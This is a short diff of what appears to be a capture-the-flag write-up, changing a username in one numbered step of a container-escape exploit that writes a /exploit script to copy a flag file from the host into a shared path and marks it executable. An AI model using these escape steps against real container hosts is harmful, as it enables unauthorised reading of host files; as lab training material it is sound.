@@ -16,7 +16,7 @@
 
 #### 5.  echo '#!/bin/sh' > /exploit
 
-#### 6.  echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+#### 6.  echo "cat /home/user/flag.txt > $host_path/flag.txt" >> /exploit
 
 #### 7.  chmod a+x /exploit
 
